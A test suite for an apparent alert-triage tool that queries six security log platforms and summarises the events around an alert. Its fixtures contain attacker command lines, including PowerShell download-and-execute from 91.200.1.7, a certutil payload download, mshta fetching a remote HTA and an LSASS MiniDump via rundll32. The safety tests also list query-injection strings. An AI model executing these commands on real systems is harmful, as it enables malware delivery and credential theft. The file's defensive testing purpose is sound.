// Surrounding-log search: safety of values, pivots, the six providers' exact requests and parsing, summaries,
// settings, and how the engine uses the results.
import { afterEach, describe, expect, test } from "bun:test";
import { crowdstrikeSource } from "../server/src/logs/crowdstrike";
import { defenderSource } from "../server/src/logs/defender";
import { elasticSource } from "../server/src/logs/elastic";
import { alertTime, logConfigFromEnv, pivotsFor, runPivot, type LogEvent, type LogSearcher, type LogSource, type Pivot } from "../server/src/logs";
import { isSafe, quoted } from "../server/src/logs/safety";
import { secopsSource, serviceAccountJwt } from "../server/src/logs/secops";
import { parseSplunkExport, splunkSource } from "../server/src/logs/splunk";
import { summarise } from "../server/src/logs/summarise";
import { visionOneSource } from "../server/src/logs/visionone";
import { entitiesFrom } from "../server/src/loops";
import { investigate } from "../server/src/triage";
import { standInServices, stubPublicFetch, testCtx } from "./helpers";

type Call = { url: string; method: string; headers: Headers; body: string };
const original = globalThis.fetch;
afterEach(() => { globalThis.fetch = original; });
function mock(respond: (c: Call, n: number) => { status: number; body: unknown; raw?: string }): Call[] {
  const calls: Call[] = [];
  globalThis.fetch = (async (input: string | URL | Request, init: RequestInit = {}) => {
    const c = { url: String(input), method: init.method ?? "GET", headers: new Headers(init.headers), body: typeof init.body === "string" ? init.body : init.body instanceof URLSearchParams ? init.body.toString() : "" };
    calls.push(c);
    const r = respond(c, calls.length);
    return new Response(r.raw ?? JSON.stringify(r.body), { status: r.status });
  }) as unknown as typeof fetch;
  return calls;
}

const AT = new Date("2026-09-28T10:00:00Z");
const NOW = new Date("2026-09-28T12:00:00Z");
const pivot = (over: Partial<Pivot> = {}): Pivot => ({ kind: "host_activity", value: "ws-hr-11", start: new Date("2026-09-28T09:30:00Z"), end: new Date("2026-09-28T10:30:00Z"), label: "Activity on ws-hr-11", ...over });
const form = (body: string) => Object.fromEntries(new URLSearchParams(body));

describe("values from alerts", () => {
  test("only plain host, account, process, hash, IP and domain values are ever searched", () => {
    for (const v of ["ws-hr-11", "WS-HR-11.corp.example"]) expect(isSafe("host", v)).toBe(true);
    for (const v of ['ws01" | delete', "ws01*", "ws 01", "ws01\n| outputlookup", "`macro`", "[search x]", "a'b", "h(x)"]) expect(isSafe("host", v)).toBe(false);
    expect(isSafe("account", "m.jones")).toBe(true);
    expect(isSafe("account", "m.jones\" OR 1=1")).toBe(false);
    expect(isSafe("process", "PsExec64.exe")).toBe(true);
    expect(isSafe("process", "cmd.exe /c")).toBe(false);
    expect(isSafe("ip", "45.9.1.2")).toBe(true);
    expect(isSafe("ip", "45.9.1.999")).toBe(false);
    expect(isSafe("domain", "evil.top")).toBe(true);
    expect(isSafe("domain", "evil.top\"")).toBe(false);
    expect(isSafe("sha256", "a".repeat(64))).toBe(true);
    expect(quoted('a"b\\c')).toBe('"a\\"b\\\\c"');
    expect(() => quoted("a\nb")).toThrow("control characters");
  });
  test("every provider refuses an unsafe value even if one reaches it", async () => {
    const bad = pivot({ value: 'ws01" | delete' });
    const sources: LogSource[] = [
      defenderSource({ tenantId: "t", clientId: "c", clientSecret: "s", graphUrl: "https://graph.microsoft.com", loginUrl: "https://login.microsoftonline.com", timeoutMs: 1000 }),
      splunkSource({ url: "https://splunk.example:8089", token: "t", baseSearch: "index=*", timeoutMs: 1000 }),
      elasticSource({ url: "https://es.example", apiKey: "k", index: "logs-*", timeoutMs: 1000 }),
      crowdstrikeSource({ baseUrl: "https://api.crowdstrike.com", clientId: "c", clientSecret: "s", repository: "search-all", timeoutMs: 1000 }),
      visionOneSource({ baseUrl: "https://api.xdr.trendmicro.com", token: "t", timeoutMs: 1000 }),
      secopsSource({ baseUrl: "https://us-chronicle.googleapis.com", project: "p", location: "us", instance: "i", account: { client_email: "a@b", private_key: "x" }, timeoutMs: 1000 }),
    ];
    const calls = mock(() => ({ status: 200, body: {} }));
    for (const s of sources) { const r = await s.search(bad, 10); expect(r.ok).toBe(false); expect(r.error).toContain("unsafe"); }
    expect(calls).toEqual([]);
  });
});

describe("pivots", () => {
  test("alert time from JSON fields, text, or now", () => {
    expect(alertTime(JSON.stringify({ rule: "x", detection: { createdDateTime: "2026-09-28T10:00:00Z" } }), NOW).at.toISOString()).toBe("2026-09-28T10:00:00.000Z");
    expect(alertTime(JSON.stringify({ eventTime: 1790589600000 }), NOW).at.getTime()).toBe(1790589600000);
    expect(alertTime("EDR alert at 2026-09-28 09:15:00Z on WS-1", NOW).at.toISOString()).toBe("2026-09-28T09:15:00.000Z");
    expect(alertTime("no time here", NOW)).toEqual({ at: NOW, fromAlert: false });
    expect(alertTime(JSON.stringify({ timestamp: "2031-01-01T00:00:00Z" }), NOW).fromAlert).toBe(false);
  });
  test("the searches an analyst would run, with safe values only", () => {
    const entities = entitiesFrom({ users: ["CORP\\m.jones"], hosts: ["WS-HR-11.corp.example"], ips: ["10.0.0.5", "45.9.1.2"], domains: ["evil.top"], hashes: ["b".repeat(64)], commands: [], title: "" });
    const p = pivotsFor({ entities, processes: ["C:\\Windows\\System32\\certutil.exe"], commandLines: [], at: AT, now: NOW }, { windowMinutes: 30 });
    expect(p.map((x) => x.kind)).toEqual(["host_activity", "process_tree", "user_activity", "hash_prevalence", "ip_prevalence", "domain_prevalence"]);
    expect(p[0]).toMatchObject({ value: "ws-hr-11", start: new Date("2026-09-28T09:30:00Z"), end: new Date("2026-09-28T10:30:00Z") });
    expect(p[1]).toMatchObject({ process: "certutil.exe" });
    expect(p[2]!.start).toEqual(new Date("2026-09-27T10:00:00Z"));
    expect(p[4]!.value).toBe("45.9.1.2"); // the private 10.0.0.5 isn't a prevalence search
    expect(p[3]!.end).toEqual(NOW); // never in the future
  });
});

describe("Microsoft Defender XDR (Graph advanced hunting)", () => {
  const src = () => defenderSource({ tenantId: "tenant-1", clientId: "cid", clientSecret: "sec", graphUrl: "https://graph.microsoft.com", loginUrl: "https://login.microsoftonline.com", timeoutMs: 5000 });
  test("client-credentials token once, then KQL through runHuntingQuery", async () => {
    const calls = mock((c) => c.url.includes("oauth2") ? { status: 200, body: { access_token: "tok", expires_in: 3599 } } : { status: 200, body: { schema: [], results: [
      { Timestamp: "2026-09-28T10:01:00Z", DeviceName: "ws-hr-11.corp.example", Category: "process", AccountName: "m.jones", FileName: "powershell.exe", ProcessCommandLine: "powershell -enc AAAA", InitiatingProcessFileName: "winword.exe", SHA256: "c".repeat(64), ActionType: "ProcessCreated" },
      { Timestamp: "2026-09-28T10:02:00Z", DeviceName: "ws-hr-11.corp.example", Category: "network", AccountName: "m.jones", FileName: "powershell.exe", RemoteIP: "45.9.1.2", RemotePort: 443, RemoteUrl: "https://evil.top/a", ActionType: "ConnectionSuccess" },
    ] } });
    const s = src();
    const r = await s.search(pivot(), 200);
    await s.search(pivot({ kind: "ip_prevalence", value: "45.9.1.2" }), 200);
    expect(calls.filter((c) => c.url.includes("oauth2")).length).toBe(1);
    expect(calls[0]!.url).toBe("https://login.microsoftonline.com/tenant-1/oauth2/v2.0/token");
    expect(form(calls[0]!.body)).toMatchObject({ client_id: "cid", client_secret: "sec", scope: "https://graph.microsoft.com/.default", grant_type: "client_credentials" });
    expect(calls[1]!.url).toBe("https://graph.microsoft.com/v1.0/security/runHuntingQuery");
    expect(calls[1]!.headers.get("authorization")).toBe("Bearer tok");
    const body = JSON.parse(calls[1]!.body);
    expect(body.Timespan).toBe("2026-09-28T09:30:00.000Z/2026-09-28T10:30:00.000Z");
    expect(body.Query).toContain('DeviceName =~ "ws-hr-11" or DeviceName startswith "ws-hr-11."');
    expect(body.Query).toContain("DeviceProcessEvents");
    expect(body.Query).toContain("take 200");
    expect(JSON.parse(calls[2]!.body).Query).toContain('RemoteIP == "45.9.1.2"');
    expect(r.ok).toBe(true);
    expect(r.events[0]).toMatchObject({ category: "process", host: "ws-hr-11.corp.example", user: "m.jones", process: "powershell.exe", parent: "winword.exe", commandLine: "powershell -enc AAAA" });
    expect(r.events[1]).toMatchObject({ category: "network", dstIp: "45.9.1.2", dstPort: 443, domain: "evil.top" });
  });
  test("a refused token is reported, not thrown", async () => {
    mock(() => ({ status: 401, body: { error: "invalid_client" } }));
    const r = await src().search(pivot(), 10);
    expect(r).toMatchObject({ ok: false });
    expect(r.error).toContain("refused the credentials");
  });
});

describe("Splunk (REST export, SPL)", () => {
  test("form-encoded export with CIM fields; streamed JSON rows", async () => {
    const calls = mock(() => ({ status: 200, body: null, raw: [
      JSON.stringify({ preview: false, result: { _time: "2026-09-28T10:01:00.000+00:00", dest: "ws-hr-11", user: "CORP\\m.jones", process_name: "certutil.exe", process: "certutil -urlcache -f http://45.9.1.2/p.exe", parent_process_name: "cmd.exe" } }),
      JSON.stringify({ preview: false, result: { _time: "1790589720", dest: "ws-hr-11", dest_ip: "45.9.1.2", dest_port: "80" } }),
      "",
    ].join("\n") }));
    const r = await splunkSource({ url: "https://splunk.example:8089", token: "tok", baseSearch: "index=edr", timeoutMs: 5000 }).search(pivot({ kind: "process_tree", process: "certutil.exe" }), 200);
    expect(calls[0]!.url).toBe("https://splunk.example:8089/services/search/v2/jobs/export");
    expect(calls[0]!.method).toBe("POST");
    expect(calls[0]!.headers.get("authorization")).toBe("Bearer tok");
    const f = form(calls[0]!.body);
    expect(f.output_mode).toBe("json");
    expect(f.earliest_time).toBe(String(new Date("2026-09-28T09:30:00Z").getTime() / 1000));
    expect(f.search).toStartWith('search index=edr (host="ws-hr-11" OR host="ws-hr-11.*" OR dest="ws-hr-11"');
    expect(f.search).toContain('process_name="certutil.exe"');
    expect(f.search).toContain("| head 200 | table _time host dest user");
    expect(r.events).toHaveLength(2);
    expect(r.events[0]).toMatchObject({ category: "process", host: "ws-hr-11", process: "certutil.exe", parent: "cmd.exe" });
    expect(r.events[1]).toMatchObject({ category: "network", dstIp: "45.9.1.2", dstPort: 80, time: "2026-09-28T10:02:00.000Z" });
  });
  test("user searches cover DOMAIN\\user and UPN forms; errors come through", () => {
    expect(parseSplunkExport(JSON.stringify({ messages: [{ type: "FATAL", text: "Error in 'search' command" }] })).errors).toEqual(["Error in 'search' command"]);
  });
});

describe("Elastic (Query DSL, ECS)", () => {
  test("ApiKey auth, JSON query with case-insensitive terms, hits parsed", async () => {
    const calls = mock(() => ({ status: 200, body: { hits: { hits: [{ _source: { "@timestamp": "2026-09-28T10:01:00Z", event: { category: ["process"], action: "start" }, host: { name: "ws-hr-11" }, user: { name: "m.jones" }, process: { name: "rundll32.exe", command_line: "rundll32 comsvcs.dll MiniDump", parent: { name: "cmd.exe" }, hash: { sha256: "d".repeat(64) } } } }] } } }));
    const r = await elasticSource({ url: "https://es.example:9243", apiKey: "a2V5", index: "logs-*,winlogbeat-*", timeoutMs: 5000 }).search(pivot(), 100);
    expect(calls[0]!.url).toBe("https://es.example:9243/logs-*,winlogbeat-*/_search?ignore_unavailable=true&allow_no_indices=true");
    expect(calls[0]!.headers.get("authorization")).toBe("ApiKey a2V5");
    const body = JSON.parse(calls[0]!.body);
    expect(body.size).toBe(100);
    expect(JSON.stringify(body.query)).toContain('{"term":{"host.name":{"value":"ws-hr-11","case_insensitive":true}}}');
    expect(body.query.bool.filter[0]).toEqual({ range: { "@timestamp": { gte: "2026-09-28T09:30:00.000Z", lte: "2026-09-28T10:30:00.000Z" } } });
    expect(r.events[0]).toMatchObject({ category: "process", host: "ws-hr-11", user: "m.jones", process: "rundll32.exe", parent: "cmd.exe", sha256: "d".repeat(64) });
  });
});

describe("Google SecOps (Chronicle API udmSearch)", () => {
  test("signed service-account JWT, then a UDM search on the regional endpoint", async () => {
    const pair = await crypto.subtle.generateKey({ name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" }, true, ["sign", "verify"]);
    const pkcs8 = Buffer.from(await crypto.subtle.exportKey("pkcs8", pair.privateKey)).toString("base64");
    const account = { client_email: "triage@proj.iam.gserviceaccount.com", private_key: `-----BEGIN PRIVATE KEY-----\n${pkcs8}\n-----END PRIVATE KEY-----\n` };
    const jwt = await serviceAccountJwt(account, "https://www.googleapis.com/auth/cloud-platform", 1_790_000_000);
    const [h, c, sig] = jwt.split(".");
    expect(JSON.parse(Buffer.from(c!, "base64url").toString())).toEqual({ iss: account.client_email, scope: "https://www.googleapis.com/auth/cloud-platform", aud: "https://oauth2.googleapis.com/token", iat: 1_790_000_000, exp: 1_790_003_600 });
    expect(await crypto.subtle.verify("RSASSA-PKCS1-v1_5", pair.publicKey, Buffer.from(sig!, "base64url"), new TextEncoder().encode(`${h}.${c}`))).toBe(true);

    const calls = mock((call) => call.url.startsWith("https://oauth2") ? { status: 200, body: { access_token: "gtok", expires_in: 3599 } } : { status: 200, body: { events: [{ name: "e1", udm: { metadata: { eventTimestamp: "2026-09-28T10:01:00Z", eventType: "PROCESS_LAUNCH" }, principal: { hostname: "ws-hr-11", user: { userid: "m.jones" }, process: { file: { fullPath: "C:\\Windows\\System32\\cmd.exe" } } }, target: { process: { commandLine: "whoami /all", file: { fullPath: "C:\\Windows\\System32\\whoami.exe", sha256: "e".repeat(64) } } } } }], moreDataAvailable: false } });
    const r = await secopsSource({ baseUrl: "https://us-chronicle.googleapis.com", project: "proj", location: "us", instance: "abc-123", account, timeoutMs: 5000 }).search(pivot(), 200);
    expect(form(calls[0]!.body).grant_type).toBe("urn:ietf:params:oauth:grant-type:jwt-bearer");
    const url = new URL(calls[1]!.url);
    expect(url.origin + url.pathname).toBe("https://us-chronicle.googleapis.com/v1/projects/proj/locations/us/instances/abc-123:udmSearch");
    expect(url.searchParams.get("query")).toContain("principal.hostname = /^ws\\-hr\\-11(\\..*)?$/ nocase");
    expect(url.searchParams.get("query")).toContain('metadata.event_type = "PROCESS_LAUNCH"');
    expect(url.searchParams.get("timeRange.startTime")).toBe("2026-09-28T09:30:00.000Z");
    expect(url.searchParams.get("limit")).toBe("200");
    expect(calls[1]!.headers.get("authorization")).toBe("Bearer gtok");
    expect(r.events[0]).toMatchObject({ category: "process", host: "ws-hr-11", user: "m.jones", process: "whoami.exe", parent: "cmd.exe", commandLine: "whoami /all" });
  });
});

describe("CrowdStrike Falcon (NG-SIEM query jobs, CQL)", () => {
  test("token, start job, poll until done, delete", async () => {
    const calls = mock((c, n) => {
      if (c.url.endsWith("/oauth2/token")) return { status: 201, body: { access_token: "cs", expires_in: 1799 } };
      if (c.method === "POST") return { status: 200, body: { id: "job-1", hashedQueryOnView: "x" } };
      if (c.method === "DELETE") return { status: 204, body: null, raw: "" };
      return n < 4 ? { status: 200, body: { done: false, events: [] } } : { status: 200, body: { done: true, cancelled: false, events: [{ "@timestamp": 1790589660000, "#event_simpleName": "ProcessRollup2", ComputerName: "WS-HR-11", UserName: "m.jones", FileName: "mshta.exe", CommandLine: "mshta https://evil.top/x.hta", ParentBaseFileName: "explorer.exe", SHA256HashData: "f".repeat(64) }], metaData: { extraData: { hasMoreEvents: "false" } } } };
    });
    const r = await crowdstrikeSource({ baseUrl: "https://api.eu-1.crowdstrike.com", clientId: "c", clientSecret: "s", repository: "search-all", timeoutMs: 5000, pollMs: 5 }).search(pivot(), 200);
    await Bun.sleep(10);
    expect(form(calls[0]!.body)).toEqual({ client_id: "c", client_secret: "s" });
    expect(calls[1]!.url).toBe("https://api.eu-1.crowdstrike.com/humio/api/v1/repositories/search-all/queryjobs");
    const body = JSON.parse(calls[1]!.body);
    expect(body).toMatchObject({ start: new Date("2026-09-28T09:30:00Z").getTime(), end: new Date("2026-09-28T10:30:00Z").getTime(), isLive: false });
    expect(body.queryString).toContain("#event_simpleName=/^(ProcessRollup2|NetworkConnectIP4|DnsRequest)$/");
    expect(body.queryString).toContain('match(file="aid_master_main.csv", field=aid, include=[ComputerName], strict=false)');
    expect(body.queryString).toContain("ComputerName=/^ws\\-hr\\-11(\\..*)?$/i");
    expect(body.queryString).toContain("| tail(200) | table([@timestamp");
    expect(calls.some((c) => c.method === "DELETE" && c.url.endsWith("/queryjobs/job-1"))).toBe(true);
    expect(r.ok).toBe(true);
    expect(r.events[0]).toMatchObject({ category: "process", host: "WS-HR-11", process: "mshta.exe", parent: "explorer.exe", time: "2026-09-28T10:01:00.000Z" });
  });
});

describe("Trend Vision One (search API v3.0)", () => {
  test("TMV1-Query header, second-precision times, allowed top value", async () => {
    const calls = mock(() => ({ status: 200, body: { items: [{ eventTime: 1790589660000, eventId: 1, eventSubId: 2, endpointHostName: "WS-HR-11", logonUser: ["m.jones"], processCmd: "C:\\Windows\\explorer.exe", objectCmd: "\"C:\\Windows\\System32\\mshta.exe\" https://evil.top/x.hta", objectFileHashSha256: "a".repeat(64) }], nextLink: "" } }));
    const r = await visionOneSource({ baseUrl: "https://api.eu.xdr.trendmicro.com", token: "v1", timeoutMs: 5000 }).search(pivot(), 200);
    const url = new URL(calls[0]!.url);
    expect(url.pathname).toBe("/v3.0/search/endpointActivities");
    expect(url.searchParams.get("startDateTime")).toBe("2026-09-28T09:30:00Z");
    expect(url.searchParams.get("top")).toBe("500");
    expect(calls[0]!.headers.get("tmv1-query")).toBe('endpointHostName:"ws-hr-11" and (eventId:"1" or eventId:"3" or eventId:"4")');
    expect(calls[0]!.headers.get("authorization")).toBe("Bearer v1");
    expect(r.events[0]).toMatchObject({ category: "process", host: "WS-HR-11", user: "m.jones", process: "mshta.exe", parent: "explorer.exe" });
  });
});

describe("summaries", () => {
  const ev = (e: Partial<LogEvent>): LogEvent => ({ time: "2026-09-28T10:00:00Z", category: "process", ...e });
  test("host activity: what ran and where it connected, plus new leads", () => {
    const s = summarise(pivot(), [
      ev({ user: "m.jones", parent: "winword.exe", process: "powershell.exe", commandLine: "powershell -enc AAAA", sha256: "c".repeat(64) }),
      ev({ time: "2026-09-28T10:02:00Z", category: "network", dstIp: "45.9.1.2", dstPort: 443 }), ev({ time: "2026-09-28T10:03:00Z", category: "network", dstIp: "45.9.1.2", dstPort: 443 }),
      ev({ category: "dns", domain: "evil.top" }),
    ], false);
    expect(s.findings[0]).toBe("1 process starts, 2 network connections, 1 DNS lookups.");
    expect(s.findings).toContain("2026-09-28 10:00 m.jones: winword.exe → powershell -enc AAAA");
    expect(s.findings).toContain("Connections to: 45.9.1.2:443 (2).");
    expect(s.discovered.map((d) => `${d.type}:${d.value}`)).toEqual(["ip:45.9.1.2", "domain:evil.top", `sha256:${"c".repeat(64)}`]);
  });
  test("prevalence and sign-ins", () => {
    const p = summarise(pivot({ kind: "hash_prevalence", value: "c".repeat(64) }), [ev({ host: "A" }), ev({ host: "B", time: "2026-09-27T10:00:00Z" }), ev({ host: "A" })], false);
    expect(p.findings[0]).toBe("Seen on 2 hosts: a (2), b. 3 events; first 2026-09-27 10:00, last 2026-09-28 10:00.");
    const u = summarise(pivot({ kind: "user_activity", value: "m.jones" }), [ev({ category: "logon", outcome: "success", srcIp: "203.0.113.9", logonType: "10" }), ev({ category: "logon", outcome: "failure", srcIp: "203.0.113.9" })], false);
    expect(u.findings).toContain("Sign-ins: 1 succeeded, 1 failed.");
    expect(u.findings).toContain("Sign-in sources: 203.0.113.9 (2).");
    expect(summarise(pivot(), [], false).findings).toEqual(["No matching events in this window."]);
  });
  test("several sources are merged; a failing one is reported", async () => {
    const good: LogSource = { provider: "defender", search: async () => ({ ok: true, events: [ev({ process: "a.exe" })], truncated: false, query: "q", durationMs: 1 }) };
    const bad: LogSource = { provider: "splunk", search: async () => ({ ok: false, events: [], truncated: false, query: "q", error: "Splunk could not be reached or timed out.", durationMs: 1 }) };
    const { view } = await runPivot([good, bad], pivot(), { windowMinutes: 30, opening: [], timeoutMs: 5000, maxEvents: 200 });
    expect(view).toMatchObject({ sources: ["Microsoft Defender XDR"], events: 1, errors: ["Splunk could not be reached or timed out."] });
  });
});

describe("settings", () => {
  test("sources are detected from complete credentials, and checked", () => {
    expect(logConfigFromEnv({}).providers).toEqual([]);
    expect(logConfigFromEnv({ SPLUNK_URL: "https://s:8089", SPLUNK_TOKEN: "t", VISIONONE_TOKEN: "v" }).providers).toEqual(["splunk", "visionone"]);
    expect(logConfigFromEnv({ SPLUNK_URL: "https://s:8089", SPLUNK_TOKEN: "t", LOG_SOURCES: "none" }).providers).toEqual([]);
    expect(() => logConfigFromEnv({ LOG_SOURCES: "defender" })).toThrow("incomplete");
    expect(() => logConfigFromEnv({ LOG_SOURCES: "qradar" })).toThrow("unknown source");
    expect(() => logConfigFromEnv({ ELASTIC_URL: "http://es.example:9200", ELASTIC_API_KEY: "k" })).toThrow("must use https");
    expect(logConfigFromEnv({ ELASTIC_URL: "http://localhost:9200", ELASTIC_API_KEY: "k" }).providers).toEqual(["elastic"]);
    expect(() => logConfigFromEnv({ CROWDSTRIKE_CLIENT_ID: "c", CROWDSTRIKE_CLIENT_SECRET: "s", CROWDSTRIKE_REPOSITORY: "../x" })).toThrow("CROWDSTRIKE_REPOSITORY");
    expect(() => logConfigFromEnv({ SECOPS_PROJECT: "p", SECOPS_INSTANCE: "i", SECOPS_CREDENTIALS_JSON: "{}" })).toThrow("client_email");
    expect(() => logConfigFromEnv({ LOG_SEARCH_OPENING: "everything" })).toThrow("unknown search");
    expect(logConfigFromEnv({ LOG_SEARCH_WINDOW_MINUTES: "15", LOG_SEARCH_OPENING: "host_activity" }).search).toMatchObject({ windowMinutes: 15, opening: ["host_activity"] });
  });
});

describe("in the investigation", () => {
  const ALERT = JSON.stringify({ rule_name: "Suspicious mshta", detectedDateTime: "2026-09-28T10:00:00Z", device: { hostname: "WS-HR-11" }, user: "CORP\\m.jones", process: { name: "mshta.exe", command_line: "mshta.exe https://verify-human-cdn.top/check.mp4", parent_process_name: "msedge.exe" } });
  function searcher(): { logs: LogSearcher; ran: Pivot[] } {
    const ran: Pivot[] = [];
    const source: LogSource = { provider: "defender", async search(p) { ran.push(p); return { ok: true, truncated: false, query: "q", durationMs: 1, events: p.kind === "host_activity"
      ? [{ time: "2026-09-28T10:03:00Z", category: "process", host: "ws-hr-11", user: "m.jones", parent: "mshta.exe", process: "powershell.exe", commandLine: "powershell -w hidden -c iwr http://91.200.1.7/s.ps1|iex" }, { time: "2026-09-28T10:03:05Z", category: "network", host: "ws-hr-11", dstIp: "91.200.1.7", dstPort: 80 }]
      : [] }; } };
    const settings = { windowMinutes: 30, opening: ["host_activity", "process_tree"] as Pivot["kind"][], timeoutMs: 5000, maxEvents: 200 };
    return { ran, logs: { settings, sources: ["defender"], run: (p) => runPivot([source], p, settings) } };
  }
  test("opening searches run with the alert's time; Jev sees the results and log questions; more searches are offered as leads", async () => {
    const restore = stubPublicFetch();
    try {
      const { logs, ran } = searcher();
      const states: string[] = []; const questions: string[] = [];
      const s = standInServices(); const orig = s.jevEvaluate;
      s.jevEvaluate = async (a) => { states.push(a.state); questions.push(a.questionsJson); return orig(a); };
      const r = await investigate({ ...testCtx(s), logs }, ALERT, [], [], 2);
      expect(ran.map((p) => p.kind).slice(0, 2).sort()).toEqual(["host_activity", "process_tree"]);
      expect(ran[0]!.start.toISOString()).toBe("2026-09-28T09:30:00.000Z");
      expect(r.logSearches?.[0]).toMatchObject({ kind: "host_activity", sources: ["Microsoft Defender XDR"], events: 2 });
      expect(states.some((x) => x.includes("surroundingLogs") && x.includes("iwr http://91.200.1.7/s.ps1|iex"))).toBe(true);
      expect(questions.some((x) => x.includes("follow-on attacker activity"))).toBe(true);
      const lead = questions.map((x) => JSON.parse(x)).find((x) => x.lead)?.lead;
      expect(Object.keys(lead.criteria)).toContain("search logs: Sign-ins and activity of m.jones in the 24 hours before the alert");
      expect(Object.keys(lead.criteria)).toContain("lookup 91.200.1.7");
    } finally { restore(); }
  });
  test("when Jev picks a log search, it runs and the result is added", async () => {
    const restore = stubPublicFetch();
    try {
      const { logs, ran } = searcher();
      const s = standInServices(); const orig = s.jevEvaluate;
      s.jevEvaluate = async (a) => {
        const res = await orig(a); const q = JSON.parse(a.questionsJson) as Record<string, { criteria?: Record<string, string> }>;
        const pick = q.lead ? Object.keys(q.lead.criteria ?? {}).find((k) => k.startsWith("search logs: Sign-ins")) : undefined;
        if (!pick) return res;
        const body = JSON.parse(res.dataJson!); body.answers.lead = { type: "choice", choice: pick, confidence: 0.8, probabilities: { [pick]: 0.8 } };
        return { ...res, dataJson: JSON.stringify(body) };
      };
      // An alert Jev can't settle in round 1, so it looks further.
      const unsure = ALERT.replace("Suspicious mshta", "Account discovery").replace("mshta.exe https://verify-human-cdn.top/check.mp4", "whoami.exe /all").replace('"name":"mshta.exe"', '"name":"whoami.exe"');
      const r = await investigate({ ...testCtx(s), logs }, unsure, [], [], 3);
      expect(ran.some((p) => p.kind === "user_activity" && p.value === "m.jones")).toBe(true);
      expect(r.logSearches?.map((v) => v.kind)).toContain("user_activity");
      expect(r.leads.join(" ")).toContain("Jev searched the logs: Sign-ins and activity of m.jones");
    } finally { restore(); }
  });
});

describe("through the running app", () => {
  test("a pasted alert is triaged with its surrounding logs, and the ticket shows them", async () => {
    const { mkdtempSync, rmSync } = await import("node:fs"); const { tmpdir } = await import("node:os"); const { join } = await import("node:path");
    const { loadConfig } = await import("../server/src/config"); const { startApp } = await import("../server/src/server"); const { createServices } = await import("../server/src/services");
    const dir = mkdtempSync(join(tmpdir(), "jev-logs-"));
    const base = loadConfig();
    const config = { ...base, host: "127.0.0.1", port: 0, dataDir: dir, databasePath: join(dir, "t.db"), uploadDir: join(dir, "up"), memoryDir: join(dir, "m"), ai: { ...base.ai, mode: "off" as const }, auth: { user: undefined, password: undefined, allowNoAuth: false } };
    const stand = standInServices();
    const source: LogSource = { provider: "splunk", search: async () => ({ ok: true, truncated: false, query: "q", durationMs: 1, events: [{ time: "2026-09-28T10:01:00Z", category: "process", host: "ws-hr-11", process: "whoami.exe", commandLine: "whoami /all", parent: "cmd.exe" }] }) };
    globalThis.fetch = (async (u: string | URL | Request, i?: RequestInit) => (String(u).startsWith("http://127.0.0.1") ? original(u, i) : new Response("{}", { status: 404 }))) as unknown as typeof fetch;
    const app = await startApp(config, { services: { ...createServices(config), jevEvaluate: stand.jevEvaluate, virustotalLookup: stand.virustotalLookup, shodanEntity: stand.shodanEntity, abuseIpdbLookup: stand.abuseIpdbLookup }, logSources: [source], log: () => undefined, pollMs: 15 });
    const api = async (a: string, b: unknown) => (await (await original(`http://127.0.0.1:${app.server.port}/api/${a}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(b) })).json()) as Record<string, any>;
    try {
      const { id } = await api("createCase", { alertText: "EDR alert: discovery\nHost: WS-HR-11\nUser: CORP\\m.jones\nCommand: whoami.exe /all" });
      await api("runCase", { id });
      let c: Record<string, any> = {};
      for (let i = 0; i < 300 && c.case?.status !== "completed"; i += 1) { c = await api("getCase", { id }); await Bun.sleep(15); }
      const result = JSON.parse(c.case.resultJson);
      expect(result.logSearches.map((v: { kind: string }) => v.kind).sort()).toEqual(["host_activity", "process_tree"]);
      expect(result.logSearches[0]).toMatchObject({ sources: ["Splunk"], events: 1 });
      expect(result.findings.some((f: { id: string }) => f.id === "logs_followon")).toBe(true);
    } finally { await app.stop(); rmSync(dir, { recursive: true, force: true }); }
  });
});
